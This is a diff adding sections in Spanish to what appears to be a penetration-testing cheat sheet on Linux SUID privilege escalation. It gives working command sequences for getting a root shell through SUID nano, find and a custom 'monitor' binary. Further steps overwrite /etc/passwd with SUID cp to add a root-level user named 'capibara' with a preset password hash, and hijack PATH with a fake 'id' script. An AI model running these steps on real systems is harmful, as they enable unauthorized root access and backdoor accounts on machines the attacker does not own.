@@ -58,6 +58,47 @@ Forma 2:
 
 ❯ find . -exec /bin/sh -p \; -quit    # Obtener consola como root
 ```
+## Nano 
+```bash 
+-rwsr-xr-x 1 root root /usr/bin/nano
+
+❯ nano 
+❯ ^R^X = (Ctrl + R, Crtl + X)
+❯ reset; sh 1>&0 2>&0
+```
+## CP
+```bash 
+-rwsr-xr-x 1 root root /usr/bin/cp
+
+❯ openssl passwd -1 -salt hax Password123    # Generar una password en Kali 
+	$1$hax$pfAXe0eaZZrVNJ0411ItB/
+
+❯ cp /etc/passwd /tmp/p && echo 'capibara:$1$hax$pfAXe0eaZZrVNJ0411ItB/:0:0::/root:/bin/bash' >> /tmp/p 
+# Utilizar el CP normal sin SUID en la máquina víctima linux paara hacer una copia del /etc/passwd 
+
+❯ /usr/bin/cp /tmp/p /etc/passwd
+# Utilizar el CP con suid en la máquina víctima linux para sobreescribir el /etc/passwd
+```
+## Monitor 
+```bash 
+-rwsr-xr-x 1 root root /usr/bin/monitor 
+
+❯ /usr/bin/monitor           # Ejecutar para ver que hace
+❯ strings /usr/bin/monitor   # Buscar 
+❯ strace -f -e trace=execve /usr/bin/monitor 2>&1 | grep exec   # Mirar que se ejecuta, en este caso un 'id' sin ruta absoluta
+
+	execve("/tmp/monitor", ["/tmp/monitor"], 0x7ffcdf8cee98 /* 49 vars */) = 0
+	[ptd 32763] execve("/bin/sh", ["sh", "-c", "id"], 0x7ffc6c2a3008 /* 49 vars */) = 0
+	[ptd 32764] execve("/tmp/id", ["id"], 0x557b01c9fd98 /* 49 vars */) = 0
+	[ptd 32765] execve("/bin/bash", ["/bin/bash", "-p"], 0x55af0e8baec0 /* 49 vars */) = 0    
+
+❯ echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/id    # Crear un 'id' modificado en el dir /tmp
+❯ chmod +x /tmp/id     # Permisos de ejecución 
+
+❯ export PATH=/tmp:$PATH
+❯ echo $PATH 
+❯ /usr/bin/monitor     # Ejecutar para obtener la sesión como root 
+```
 ## Base64
 ```bash 
 -rwsr-xr-x 1 root root /usr/bin/base64
